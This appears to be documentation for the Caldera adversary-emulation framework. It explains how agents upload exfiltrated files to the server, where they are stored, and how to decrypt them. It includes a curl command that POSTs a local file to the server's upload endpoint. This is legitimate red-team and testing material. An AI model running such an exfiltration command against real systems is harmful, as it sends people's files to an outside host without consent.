# Exfiltration

After completing an operation a user may want to review the data retrieved from the target system. This data is automatically stored on the Caldera server in a directory specified in [/conf/default.yml](Server-Configuration.md#configuration-file).

## Exfiltrating Files

Some abilities will transfer files from the agent to the Caldera server. This can be done manually with 
```yaml
curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
```
Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.md#configuration-file). By default it is set to `/tmp/caldera`.

## Accessing Exfiltrated Files

The server stores all exfiltrated files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.md#configuration-file). By default it is set to `/tmp/caldera`.

Files can be accessed by pulling them directly from that location when on the server and manually unencrypting the files.

To simplify accessing exfiltrated files from a running caldera server, you can go the the advanced section in the Caldera UI and click on the 'exfilled files' section.

From there you can select an operation (or all) from the drop down to see a listing of all the files in the exfil folder corresponding to the operation (specifically works with sandcat agents or any other agent using the same naming scheme for file upload folder) or in the directory along with the option to select any number of files to download directly to your machine.

All downloaded files will be unencrypted before passing along as a download.

## Accessing Operations Reports

After the server is shut down the reports from operations are placed inside the directory specified by the [/conf/default.yml to key "reports_dir"](Server-Configuration.md#configuration-file). By default it is also set to `/tmp`.


## Unencrypting the files
The reports and exfiltrated files are encrypted on the server. To view the file contents the user will have to decrypt the file using /app/utility/file_decryptor.py . This can be performed with:

```shell
python /app/utility/file_decryptor.py --config /conf/default.yml _input file path_
```

The output file will already have the _decrypted tag appended to the end of the file name once the decrypted file is created by the python script.
